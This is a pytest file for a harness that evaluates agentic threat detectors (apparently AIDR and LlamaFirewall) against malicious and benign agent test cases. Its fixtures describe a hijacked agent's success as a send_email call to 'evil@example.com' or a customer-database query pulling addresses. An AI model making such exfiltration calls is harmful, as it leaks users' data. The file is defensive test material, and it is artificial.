import json

import pytest

from toy_agent.orchestrator import CommandResult
from toy_agent.schema import TestCase, Transcript, Turn, Always, ToolCallCriterion, Contains, Equals
from toy_agent.sequence import (
    CloseStep,
    CommandStep,
    OpenStep,
    _close_container,
    _open_container,
    execute_sequence,
    validate_sequence,
)


def test_valid_reused_sequence_passes():
    steps = [
        OpenStep(containers=("agent", "detector")),
        CommandStep(case_id="c1", counts_toward_metric=True),
        CommandStep(case_id="c2", counts_toward_metric=True),
        CloseStep(containers=("agent", "detector")),
    ]
    validate_sequence(steps, known_case_ids={"c1", "c2"}, known_containers=("agent", "detector"))  # must not raise


def test_reopening_an_already_open_container_is_rejected():
    steps = [
        OpenStep(containers=("agent",)),
        OpenStep(containers=("agent", "detector")),
    ]
    with pytest.raises(ValueError, match="re-opens already-open"):
        validate_sequence(steps, known_case_ids=set(), known_containers=("agent", "detector"))


def test_command_on_a_container_that_is_not_open_is_rejected():
    steps = [OpenStep(containers=("agent",)), CommandStep(case_id="c1", counts_toward_metric=True)]
    with pytest.raises(ValueError, match="requires containers not open"):
        validate_sequence(steps, known_case_ids={"c1"}, known_containers=("agent", "detector"))


def test_closing_a_container_that_is_not_open_is_rejected():
    steps = [OpenStep(containers=("agent",)), CloseStep(containers=("agent", "detector"))]
    with pytest.raises(ValueError, match="closes containers not open"):
        validate_sequence(steps, known_case_ids=set(), known_containers=("agent", "detector"))


def test_sequence_ending_with_open_containers_is_rejected():
    steps = [OpenStep(containers=("agent", "detector"))]
    with pytest.raises(ValueError, match="still open"):
        validate_sequence(steps, known_case_ids=set(), known_containers=("agent", "detector"))


def test_command_referencing_an_unknown_case_id_is_rejected():
    steps = [OpenStep(containers=("agent", "detector")), CommandStep(case_id="ghost", counts_toward_metric=True)]
    with pytest.raises(ValueError, match="unknown case_id"):
        validate_sequence(steps, known_case_ids={"c1"}, known_containers=("agent", "detector"))


class RecordingCommandRunner:
    def __init__(self):
        self.calls = []

    def __call__(self, cmd, stdin_bytes, timeout_s):
        self.calls.append(cmd)
        return CommandResult(returncode=0, stdout=b"", stderr=b"")


def test_open_container_removes_before_recreating():
    runner = RecordingCommandRunner()
    _open_container("detector", runner)
    assert runner.calls[0] == ["docker", "compose", "rm", "-f", "-s", "-v", "detector"]
    assert runner.calls[1] == ["docker", "compose", "up", "-d", "detector"]
    assert len(runner.calls) == 2


def test_close_container_removes_never_just_stops():
    runner = RecordingCommandRunner()
    _close_container("agent", runner)
    assert runner.calls == [["docker", "compose", "rm", "-f", "-s", "-v", "agent"]]
    assert not any("stop" in call for call in runner.calls)


def _ground_truth(
    case_id, label="benign", technique_target=None, rationale="r",
    seed_content="hi", attack_success_criteria=None,
):
    transcript = Transcript(session_id=case_id, turns=[Turn(seq=0, role="user", content=seed_content)])
    if label == "malicious" and attack_success_criteria is None:
        attack_success_criteria = Always()
    return TestCase(
        case_id=case_id, label=label, technique_target=technique_target,
        rationale=rationale, transcript=transcript,
        attack_success_criteria=attack_success_criteria,
    )


def _ok_result(case_id, label="benign", technique=None):
    return {
        "transcript": {"session_id": case_id, "turns": [], "stop_reason": "completed"},
        "verdict": {
            "case_id": case_id, "tool_name": "agentic_threat_detection", "status": "ok",
            "label": label, "confidence": 0.9, "technique_detected": technique,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
            "in_tokens": 10, "out_tokens": 5,
        },
    }


def _infra_result(case_id):
    return {
        "transcript": None,
        "verdict": {
            "case_id": case_id, "tool_name": "agentic_threat_detection", "status": "error",
            "error_kind": "infra", "label": None, "confidence": None, "technique_detected": None,
            "rationale": "docker compose exec failed to start", "cost_usd": None, "latency_s": None,
        },
    }


class ScriptedRunTestCase:
    def __init__(self, script):
        self._script = list(script)
        self.calls = []

    def __call__(self, test_case, *, command_index, vendor, agent_timeout_s, detector_timeout_s):
        self.calls.append((test_case, command_index, vendor))
        if not self._script:
            raise AssertionError("script exhausted")
        result = self._script.pop(0)
        if isinstance(result, Exception):
            raise result
        return result


class NoOpCommandRunner:
    def __init__(self):
        self.calls = []

    def __call__(self, cmd, stdin_bytes, timeout_s):
        self.calls.append(cmd)
        return CommandResult(returncode=0, stdout=b"", stderr=b"")


class RecordingEvidenceCollector:
    def __init__(self):
        self.calls = []

    def __call__(self, case_id, services, evidence_dir):
        self.calls.append(case_id)
        return {}


class RecordingProxyLogCollector:
    def __init__(self):
        self.calls = []

    def __call__(self, case_id, evidence_dir, api_key, *, service, log_path):
        self.calls.append((case_id, service, log_path))
        return evidence_dir / case_id / "detector.vendor_proxy.jsonl"


def _reused_sequence(case_ids):
    return (
        [OpenStep(containers=("agent", "detector"))]
        + [CommandStep(case_id=cid, counts_toward_metric=True) for cid in case_ids]
        + [CloseStep(containers=("agent", "detector"))]
    )


def test_command_step_reaches_run_test_case_with_its_position_in_the_sequence(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])

    execute_sequence(steps, dataset, tmp_path, vendor="aidr", run_test_case_fn=runner,
                      collect_case_evidence_fn=RecordingEvidenceCollector(),
                      collect_thin_proxy_log_fn=RecordingProxyLogCollector(),
                      run_command=NoOpCommandRunner())

    sent_case, command_index, _ = runner.calls[0]
    assert sent_case["case_id"] == "c1"
    assert command_index == 1  # steps[0] is the OpenStep, steps[1] is this command


def test_open_and_close_are_issued_around_the_commands(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])
    command_runner = NoOpCommandRunner()

    execute_sequence(steps, dataset, tmp_path, vendor="aidr", run_test_case_fn=runner,
                      collect_case_evidence_fn=RecordingEvidenceCollector(),
                      collect_thin_proxy_log_fn=RecordingProxyLogCollector(),
                      run_command=command_runner)

    assert command_runner.calls[0] == ["docker", "compose", "rm", "-f", "-s", "-v", "agent"]
    assert command_runner.calls[-1][:6] == ["docker", "compose", "rm", "-f", "-s", "-v"]


def test_counts_toward_metric_false_is_excluded_from_the_metric_lists_but_kept_in_cases(tmp_path):
    dataset = {"c1": _ground_truth("c1"), "c2": _ground_truth("c2")}
    steps = [
        OpenStep(containers=("agent", "detector")),
        CommandStep(case_id="c1", counts_toward_metric=False),
        CommandStep(case_id="c2", counts_toward_metric=True),
        CloseStep(containers=("agent", "detector")),
    ]
    runner = ScriptedRunTestCase([_ok_result("c1"), _ok_result("c2")])
    evidence_collector = RecordingEvidenceCollector()
    proxy_log_collector = RecordingProxyLogCollector()

    result = execute_sequence(steps, dataset, tmp_path, vendor="aidr", run_test_case_fn=runner,
                               collect_case_evidence_fn=evidence_collector,
                               collect_thin_proxy_log_fn=proxy_log_collector,
                               run_command=NoOpCommandRunner())

    assert [c.case_id for c in result.cases] == ["c1", "c2"]
    assert [c.case_id for c in result.metric_cases] == ["c2"]
    assert [v.case_id for v in result.verdicts] == ["c1", "c2"]
    assert [v.case_id for v in result.metric_verdicts] == ["c2"]
    # c1's raw verdict is still persisted to disk even though excluded from metrics
    lines = (tmp_path / "verdicts.jsonl").read_text(encoding="utf-8").strip().splitlines()
    assert json.loads(lines[0])["case_id"] == "c1"
    # c1's raw transcript is still written to disk even though excluded from metrics
    assert (tmp_path / "raw" / "c1.transcript.json").exists()
    # both commands trigger evidence collection, regardless of counts_toward_metric
    assert evidence_collector.calls == ["c1", "c2"]
    assert proxy_log_collector.calls == [
        ("c1", "detector", "/var/log/vendor_proxy.jsonl"),
        ("c2", "detector", "/var/log/vendor_proxy.jsonl"),
    ]


def test_total_in_tokens_accumulates(tmp_path):
    dataset = {"c1": _ground_truth("c1"), "c2": _ground_truth("c2")}
    steps = _reused_sequence(["c1", "c2"])
    r1 = _ok_result("c1")
    r2 = _ok_result("c2")
    r1["verdict"]["in_tokens"] = 100
    r2["verdict"]["in_tokens"] = 200
    runner = ScriptedRunTestCase([r1, r2])

    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )

    assert result.total_in_tokens == 300


def test_circuit_breaker_trips_after_three_consecutive_infra_failures(tmp_path):
    dataset = {f"c{i}": _ground_truth(f"c{i}") for i in range(1, 5)}
    steps = _reused_sequence([f"c{i}" for i in range(1, 5)])
    runner = ScriptedRunTestCase([_infra_result("c1"), _infra_result("c2"), _infra_result("c3")])

    result = execute_sequence(steps, dataset, tmp_path, vendor="aidr", run_test_case_fn=runner,
                               collect_case_evidence_fn=RecordingEvidenceCollector(),
                               collect_thin_proxy_log_fn=RecordingProxyLogCollector(),
                               run_command=NoOpCommandRunner())

    assert len(runner.calls) == 3  # c4 never attempted
    assert result.breaker_tripped is True
    assert result.executed_count == 3
    assert result.total_count == 4


def test_breaker_trip_closes_every_still_open_container_before_returning(tmp_path):
    dataset = {f"c{i}": _ground_truth(f"c{i}") for i in range(1, 5)}
    steps = _reused_sequence([f"c{i}" for i in range(1, 5)])
    runner = ScriptedRunTestCase([_infra_result("c1"), _infra_result("c2"), _infra_result("c3")])
    command_runner = NoOpCommandRunner()

    result = execute_sequence(steps, dataset, tmp_path, vendor="aidr", run_test_case_fn=runner,
                               collect_case_evidence_fn=RecordingEvidenceCollector(),
                               collect_thin_proxy_log_fn=RecordingProxyLogCollector(),
                               run_command=command_runner)

    assert result.breaker_tripped is True
    # The written sequence's own CloseStep is never reached (the loop broke
    # before it) — these rm calls only exist because early exit closes
    # whatever is still open.
    rm_calls = [c for c in command_runner.calls if c[:6] == ["docker", "compose", "rm", "-f", "-s", "-v"]]
    assert len(rm_calls) == 4  # 2 auto-heal rm's from the initial open + 2 explicit closes on trip
    assert {c[6] for c in rm_calls[2:]} == {"agent", "detector"}


def test_an_uncaught_exception_from_run_test_case_still_closes_every_open_container(tmp_path):
    dataset = {"c1": _ground_truth("c1"), "c2": _ground_truth("c2")}
    steps = _reused_sequence(["c1", "c2"])
    runner = ScriptedRunTestCase([_ok_result("c1"), RuntimeError("simulated crash")])
    command_runner = NoOpCommandRunner()

    try:
        execute_sequence(steps, dataset, tmp_path, vendor="aidr", run_test_case_fn=runner,
                          collect_case_evidence_fn=RecordingEvidenceCollector(),
                          collect_thin_proxy_log_fn=RecordingProxyLogCollector(),
                          run_command=command_runner)
        assert False, "expected RuntimeError to propagate"
    except RuntimeError:
        pass

    rm_calls = [c for c in command_runner.calls if c[:6] == ["docker", "compose", "rm", "-f", "-s", "-v"]]
    assert len(rm_calls) == 4  # 2 auto-heal rm's from open + 2 explicit closes despite the exception
    assert {c[6] for c in rm_calls[2:]} == {"agent", "detector"}


def _ok_result_with_tool_call(case_id, tool_name, arguments, label="malicious", technique=None):
    return {
        "transcript": {
            "session_id": case_id,
            "turns": [
                {"seq": 0, "role": "user", "content": "hi", "tool_call": None},
                {
                    "seq": 1, "role": "tool", "content": "",
                    "tool_call": {"tool_name": tool_name, "arguments": arguments, "result": "ok", "status": "ok"},
                },
            ],
            "stop_reason": "completed",
        },
        "verdict": {
            "case_id": case_id, "tool_name": "agentic_threat_detection", "status": "ok",
            "label": label, "confidence": 0.9, "technique_detected": technique,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
            "in_tokens": 10, "out_tokens": 5,
        },
    }


def test_execute_sequence_computes_attack_succeeded_true_when_criterion_matches(tmp_path):
    criterion = ToolCallCriterion(tool_name="send_email", arguments={"to": Equals(value="evil@example.com")})
    dataset = {"c1": _ground_truth("c1", label="malicious", technique_target="T0012", attack_success_criteria=criterion)}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result_with_tool_call("c1", "send_email", {"to": "evil@example.com"})])
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert result.cases[0].attack_succeeded is True


def test_execute_sequence_computes_attack_succeeded_false_when_criterion_does_not_match(tmp_path):
    criterion = ToolCallCriterion(tool_name="send_email", arguments={"to": Equals(value="evil@example.com")})
    dataset = {"c1": _ground_truth("c1", label="malicious", technique_target="T0012", attack_success_criteria=criterion)}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1", label="benign")])  # no tool call at all
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert result.cases[0].attack_succeeded is False


def test_execute_sequence_leaves_attack_succeeded_none_when_transcript_is_missing(tmp_path):
    criterion = ToolCallCriterion(tool_name="send_email", arguments={"to": Equals(value="evil@example.com")})
    dataset = {"c1": _ground_truth("c1", label="malicious", technique_target="T0012", attack_success_criteria=criterion)}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_infra_result("c1")])
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert result.cases[0].attack_succeeded is None


def test_execute_sequence_leaves_attack_succeeded_none_when_criterion_cannot_be_evaluated(tmp_path):
    # A real model can emit any JSON shape for a tool call's arguments
    # (agent_loop.py json.loads()es them verbatim), so a 'contains' matcher can
    # meet a dict instead of a list/str — criteria.evaluate raises TypeError by
    # design. That must degrade to an unknown outcome for this one case, never
    # abort the whole batch run.
    criterion = ToolCallCriterion(tool_name="query_customer_db", arguments={"fields": Contains(value="address")})
    dataset = {"c1": _ground_truth("c1", label="malicious", technique_target="T0004", attack_success_criteria=criterion)}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([
        _ok_result_with_tool_call("c1", "query_customer_db", {"fields": {"include": ["address"]}}),
    ])
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert result.cases[0].attack_succeeded is None


def test_execute_sequence_leaves_attack_succeeded_none_for_benign_cases(tmp_path):
    dataset = {"c1": _ground_truth("c1")}  # benign by default
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert result.cases[0].attack_succeeded is None


# --- transcript_unusable exclusion (Gap 19/21, R9) ---

def test_a_case_whose_transcript_is_missing_stays_out_of_metric_cases(tmp_path):
    dataset = {"c1": _ground_truth("c1"), "c2": _ground_truth("c2")}
    steps = _reused_sequence(["c1", "c2"])
    runner = ScriptedRunTestCase([_infra_result("c1"), _ok_result("c2")])
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert [c.case_id for c in result.metric_cases] == ["c2"]
    assert result.transcript_unusable == {"c1": "transcript_missing"}


def test_a_case_with_unreadable_tool_arguments_stays_out_of_metric_cases(tmp_path):
    from toy_agent import run_batch

    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    raw_result = {
        "transcript": {
            "session_id": "c1",
            "turns": [
                {"seq": 0, "role": "user", "content": "hi", "tool_call": None},
                {
                    "seq": 1, "role": "tool", "content": "",
                    "tool_call": {
                        "tool_name": "send_email",
                        "arguments": {"to": "evil@example.com"},
                        "result": "ok",
                        "status": "error",
                        "arguments_parse_failed": True,
                    },
                },
            ],
            "stop_reason": "completed",
        },
        "verdict": {
            "case_id": "c1", "tool_name": "agentic_threat_detection", "status": "ok",
            "label": "malicious", "confidence": 0.9, "technique_detected": None,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
            "in_tokens": 10, "out_tokens": 5,
        },
    }
    runner = ScriptedRunTestCase([raw_result])
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert result.metric_cases == []
    assert "c1" in result.transcript_unusable
    assert run_batch.find_malicious_only_tools(result.metric_cases) == set()


def test_a_clean_case_still_enters_metric_cases(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])
    result = execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )
    assert [c.case_id for c in result.metric_cases] == ["c1"]
    assert result.transcript_unusable == {}


# --- progress_fn heartbeat (T2a) ---

def test_progress_fn_receives_starting_and_done_lines(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])
    lines = []

    execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
        progress_fn=lines.append,
    )

    assert any("[1/1] starting   c1" in line for line in lines)
    assert any("[1/1] done" in line and "c1" in line for line in lines)


def test_progress_fn_receives_infra_marker(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    # An agent-level infra failure returns transcript=None AND error_kind="infra".
    # The marker must stay INFRA, never be masked as TRANSCRIPT_MISSING.
    raw_result = _infra_result("c1")
    runner = ScriptedRunTestCase([raw_result])
    lines = []

    execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
        progress_fn=lines.append,
    )

    assert any("*** INFRA ***" in line for line in lines)
    assert not any("*** TRANSCRIPT_MISSING ***" in line for line in lines)


def test_progress_fn_none_is_silent(tmp_path, capsys):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])

    execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
    )

    captured = capsys.readouterr()
    assert captured.out == ""
    assert captured.err == ""


# --- regression: done-line content and error markers (R7, R8) ---

def test_done_line_contains_label_latency_and_in_tokens(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence(["c1"])
    raw = _ok_result("c1", label="benign")
    raw["verdict"]["latency_s"] = 2.5
    raw["verdict"]["in_tokens"] = 500
    runner = ScriptedRunTestCase([raw])
    lines = []

    execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
        progress_fn=lines.append,
    )

    done_lines = [l for l in lines if "done" in l and "c1" in l]
    assert len(done_lines) == 1
    done = done_lines[0]
    assert "***" not in done
    assert "benign" in done
    assert "s" in done
    assert "in=" in done


@pytest.mark.parametrize("marker, raw_result", [
    ("*** MODEL_ERROR (transcript unusable) ***", {
        "transcript": {"session_id": "c1", "turns": [], "stop_reason": "model_error"},
        "verdict": {
            "case_id": "c1", "tool_name": "agentic_threat_detection", "status": "ok",
            "label": "malicious", "confidence": 0.9, "technique_detected": None,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
        },
    }),
    ("*** MAX_COST (transcript unusable) ***", {
        "transcript": {"session_id": "c1", "turns": [], "stop_reason": "max_cost"},
        "verdict": {
            "case_id": "c1", "tool_name": "agentic_threat_detection", "status": "ok",
            "label": "malicious", "confidence": 0.9, "technique_detected": None,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
        },
    }),
    ("*** TRANSCRIPT_MISSING ***", {
        "transcript": None,
        "verdict": {
            "case_id": "c1", "tool_name": "agentic_threat_detection", "status": "ok",
            "label": "malicious", "confidence": 0.9, "technique_detected": None,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
        },
    }),
    ("*** ARGUMENTS_PARSE_FAILED ***", {
        "transcript": {
            "session_id": "c1",
            "turns": [
                {"seq": 0, "role": "user", "content": "hi", "tool_call": None},
                {
                    "seq": 1, "role": "tool", "content": "",
                    "tool_call": {
                        "tool_name": "send_email",
                        "arguments": {"to": "evil@example.com"},
                        "result": "ok",
                        "status": "error",
                        "arguments_parse_failed": True,
                    },
                },
            ],
            "stop_reason": "completed",
        },
        "verdict": {
            "case_id": "c1", "tool_name": "agentic_threat_detection", "status": "ok",
            "label": "malicious", "confidence": 0.9, "technique_detected": None,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
        },
    }),
    ("*** VERDICT_CONVERSION_FAILED ***", {
        "transcript": {"session_id": "c1", "turns": [], "stop_reason": "completed"},
        "verdict": {
            # missing "case_id" key — verdict_from_dict() will raise
            "tool_name": "agentic_threat_detection", "status": "ok",
            "label": "malicious", "confidence": 0.9, "technique_detected": None,
            "rationale": "r", "cost_usd": None, "latency_s": 1.0,
        },
    }),
])
def test_done_line_error_markers(tmp_path, marker, raw_result):
    """Each error outcome must produce its corresponding marker in the done line."""
    dataset = {"c1": _ground_truth("c1", label="malicious", technique_target="T0012")}
    steps = _reused_sequence(["c1"])
    runner = ScriptedRunTestCase([raw_result])
    lines = []

    execute_sequence(
        steps, dataset, tmp_path, vendor="aidr",
        run_test_case_fn=runner, collect_case_evidence_fn=RecordingEvidenceCollector(),
        collect_thin_proxy_log_fn=RecordingProxyLogCollector(), run_command=NoOpCommandRunner(),
        progress_fn=lines.append,
    )

    done_lines = [l for l in lines if "done" in l and "c1" in l]
    assert len(done_lines) == 1
    assert marker in done_lines[0]


def test_known_containers_for_resolves_the_detector_service_per_vendor():
    from toy_agent.sequence import known_containers_for
    assert known_containers_for("aidr") == ("agent", "detector")
    assert known_containers_for("llamafirewall") == ("agent", "detector-llamafirewall")


def _reused_sequence_llamafirewall(case_ids):
    # Same shape as _reused_sequence, but opens/closes "detector-llamafirewall"
    # instead of "detector" — known_containers_for("llamafirewall") requires
    # that exact service name (Task 8: docker-compose.yml service names).
    return (
        [OpenStep(containers=("agent", "detector-llamafirewall"))]
        + [CommandStep(case_id=cid, counts_toward_metric=True) for cid in case_ids]
        + [CloseStep(containers=("agent", "detector-llamafirewall"))]
    )


def test_execute_sequence_passes_the_active_vendor_to_run_test_case(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence_llamafirewall(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])
    execute_sequence(steps, dataset, tmp_path, vendor="llamafirewall", run_test_case_fn=runner,
                      collect_case_evidence_fn=RecordingEvidenceCollector(),
                      collect_thin_proxy_log_fn=RecordingProxyLogCollector(),
                      run_command=NoOpCommandRunner())
    _, _, vendor_seen = runner.calls[0]
    assert vendor_seen == "llamafirewall"


def test_execute_sequence_passes_the_resolved_service_and_log_path_for_llamafirewall(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence_llamafirewall(["c1"])
    runner = ScriptedRunTestCase([_ok_result("c1")])
    proxy_collector = RecordingProxyLogCollector()
    execute_sequence(steps, dataset, tmp_path, vendor="llamafirewall", run_test_case_fn=runner,
                      collect_case_evidence_fn=RecordingEvidenceCollector(),
                      collect_thin_proxy_log_fn=proxy_collector,
                      run_command=NoOpCommandRunner())
    _, service, log_path = proxy_collector.calls[0]
    assert service == "detector-llamafirewall"
    assert log_path == "/var/log/llamafirewall_proxy.jsonl"


def test_a_conversion_failure_uses_the_active_vendors_tool_name(tmp_path):
    dataset = {"c1": _ground_truth("c1")}
    steps = _reused_sequence_llamafirewall(["c1"])
    bad_result = _ok_result("c1")
    del bad_result["verdict"]["case_id"]  # verdict_from_dict() will raise
    runner = ScriptedRunTestCase([bad_result])
    result = execute_sequence(steps, dataset, tmp_path, vendor="llamafirewall", run_test_case_fn=runner,
                               collect_case_evidence_fn=RecordingEvidenceCollector(),
                               collect_thin_proxy_log_fn=RecordingProxyLogCollector(),
                               run_command=NoOpCommandRunner())
    assert result.verdicts[0].tool_name == "llamafirewall-alignmentcheck"
